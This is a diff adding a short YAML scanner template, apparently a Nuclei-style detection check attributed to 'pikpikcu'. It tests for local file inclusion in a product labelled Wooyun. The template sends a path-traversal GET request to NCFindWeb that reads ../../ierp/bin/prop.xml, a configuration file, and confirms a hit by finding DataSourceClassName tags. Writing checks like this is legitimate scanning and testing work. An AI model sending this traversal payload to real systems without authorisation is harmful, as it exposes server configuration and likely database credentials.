@@ -1,0 +1,25 @@
+id: wooyun-path-traversal
+brief:
+    title: Wooyun - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: Wooyun is vulnerable to local file inclusion.
+    label:
+        - lfi
+        - wooyun
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - <DataSourceClassName>
+            - </DataSourceClassName>
+          in: body
+          need: all
